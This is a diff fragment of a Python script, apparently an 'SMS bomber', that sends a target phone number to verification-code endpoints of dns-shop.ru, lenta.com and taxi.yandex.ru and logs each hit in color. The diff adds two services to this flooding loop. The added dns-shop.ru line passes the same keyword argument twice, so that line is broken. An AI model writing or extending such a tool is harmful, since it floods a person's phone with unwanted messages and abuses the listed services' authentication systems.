@@ -67,6 +67,16 @@ if t == 2:
                 except:
                     print(colored('icq-[-]', 'yellow'))
                 try:
+                    a = requests.post("https://www.dns-shop.ru/auth/auth/fast-authorization/", headers=headers, data={"FastAuthorizationLoginLoadForm[login]" : phone}, headers=headers)
+                    print(colored('dns-shop.ru-[+]', 'magenta'))
+                except:
+                    print(colored('dns-shop.ru-[-]', 'magenta'))
+                try:
+                    a = requests.post("https://lenta.com/api/v1/registration/requestValidationCode", json={"phone" : "+"+phone}, headers=headers)
+                    print(colored('lenta.com-[+]', 'blue'))
+                except:
+                    print(colored('lenta.com-[-]', 'blue'))
+                try:
                     a = requests.post("https://taxi.yandex.ru/3.0/auth",
                                   json={"id": "fa137685fd594a9f86f529eec9543e96", "phone": phone}, headers=headers)
                     print(colored('taxi.yandex-[+]', 'cyan'))
